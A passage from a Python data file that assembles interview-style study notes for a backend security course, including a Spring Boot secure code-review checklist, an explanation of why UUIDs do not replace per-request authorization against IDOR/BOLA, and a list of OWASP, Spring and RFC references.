I review in order of production risk:

1. **Authentication**: is the endpoint behind the security chain? Anything accidentally under `permitAll()`?
2. **Authorization**: role/permission check for the function (`@PreAuthorize`), **and** object-level ownership/tenant check for every ID in path, query or body (BOLA). Bulk and export variants too.
3. **Input**: request DTO with Bean Validation (`@Valid`, size, pattern, enum); no entity binding (mass assignment); limits on page size, list sizes and uploads.
4. **Data access**: parameterised queries only; allowlisted sort fields; no string-built SQL/JPQL; no user-controlled file paths or URLs (path traversal, SSRF).
5. **Output**: response DTO exposes only needed fields; no internal IDs, hashes or PII beyond need; masking applied.
6. **Business logic**: idempotency for money-moving or create operations; race conditions (concurrent requests double-spending; use conditional updates or locks); server-side calculation of prices and totals.
7. **Abuse**: rate limits for expensive or costly (SMS, email) operations.
8. **Errors and logging**: generic errors, security events logged, no tokens or PII in logs.
9. **Dependencies and config**: new libraries vetted; no CORS, Actuator or security config loosening.
10. **Tests**: negative tests, e.g. user A cannot access user B's resource, invalid input returns 400.

I label findings as blocking vs suggestions so the author knows what must change.
""", A, ["code-review", "checklist", "owasp", "api-security"], True))

QA.append(("Does switching from sequential IDs (/orders/1001) to UUIDs fix IDOR?", r"""
**No.** It reduces one attack technique (enumerating `1001, 1002, 1003...`), but it doesn't add authorization, so any UUID an attacker obtains still works.

UUIDs leak constantly:
- shared links, emails and screenshots;
- browser history, proxy and server logs, `Referer` headers;
- other API responses (a list endpoint that returns IDs of objects in a shared workspace, a public profile that references private resources);
- front-end bundles, analytics events, support tickets.

So the fix for IDOR/BOLA is always an **authorization check per request**: scope queries by owner or tenant (`findByIdAndCustomerId`), or call a central authorization policy.

**UUIDs are still worth having** for other reasons: they don't reveal business volume ("we're order #1,004, so they have about 1,000 orders"), they can be generated without a central sequence, and they make blind guessing infeasible as defence in depth. With MySQL, prefer time-ordered UUIDs (UUIDv7) stored as `BINARY(16)` to avoid random inserts fragmenting the clustered index.

A good interview answer names both sides: "UUIDs are a nice-to-have against enumeration; ownership checks are mandatory."
""", B, ["idor", "bola", "authorization", "uuid"], False))

SOURCES = [
    ("OWASP Top 10:2025 (introduction and list)", "https://owasp.org/Top10/2025/0x00_2025-Introduction/"),
    ("OWASP Top 10:2021", "https://owasp.org/Top10/"),
    ("OWASP API Security Top 10 (2023)", "https://owasp.org/API-Security/editions/2023/en/0x11-t10/"),
    ("OWASP Cheat Sheet: Password Storage", "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"),
    ("OWASP Cheat Sheet: Server-Side Request Forgery Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"),
    ("OWASP Cheat Sheet: Mass Assignment", "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"),
    ("OWASP Cheat Sheet: JSON Web Token for Java", "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"),
    ("OWASP Cheat Sheet: Secrets Management", "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"),
    ("Spring Security reference: OAuth2 Resource Server JWT", "https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/jwt.html"),
    ("Spring Security reference: CSRF", "https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html"),
    ("RFC 9700: OAuth 2.0 Security Best Current Practice (Jan 2025)", "https://datatracker.ietf.org/doc/rfc9700/"),
    ("RFC 7636: Proof Key for Code Exchange (PKCE)", "https://datatracker.ietf.org/doc/html/rfc7636"),
    ("RFC 8725: JSON Web Token Best Current Practices", "https://datatracker.ietf.org/doc/html/rfc8725"),
    ("Hogan Lovells: India's DPDP Act 2023 brought into force (DPDP Rules, Nov 2025)", "https://www.hoganlovells.com/en/publications/indias-digital-personal-data-protection-act-2023-brought-into-force-"),
]


def subject():
    return build("security", "Security for Backend Engineers", 17, "🔐",
                 "Practical application security for Spring Boot backends: OWASP Top 10 and API Top 10 with real code, authN/authZ, JWT and OAuth2 pitfalls, secrets, abuse prevention and PII handling.",
                 "sec", NOTES, QA, SOURCES)


if __name__ == "__main__":
    report(subject())
